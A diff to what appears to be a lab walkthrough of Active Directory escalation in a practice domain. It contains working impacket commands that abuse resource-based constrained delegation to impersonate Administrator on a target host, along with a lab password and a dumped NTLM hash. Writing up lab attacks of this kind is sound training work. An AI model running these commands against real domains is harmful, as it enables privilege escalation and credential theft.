@@ -99,8 +99,6 @@ Escalation needs two things:
 
 With both, the flow is: write `TestPC$` into the target's delegation list, request an S4U2Self ticket for `TestPC$`, then S4U2Proxy to obtain a service ticket for the target as `Administrator`.
 
-<!-- CONFIRM: точные команды RBCD (impacket-rbcd / addcomputer / getST) и целевой хост -->
-
 ```bash
 # 1. Grant TestPC$ the right to delegate to the target computer
 impacket-rbcd -delegate-from 'TestPC$' -delegate-to 'WINTERFELL$' -action write \
@@ -112,7 +110,7 @@ impacket-getST -spn cifs/winterfell.north.sevenkingdoms.local \
   'north.sevenkingdoms.local/TestPC$:TestPass!'
 ```
 
-The resulting ticket gives service access as `Administrator`. From there the local SAM is readable, and the local Administrator hash is the next stepping stone:
+The delegation write itself is silent by design — it prints nothing, so the first visible artefact of success is the service ticket that follows. With that ticket the local SAM becomes readable, and the local Administrator hash is the next stepping stone:
 
 ```text
 dbd13e1c4e338284ac4e9874f7de6ef4
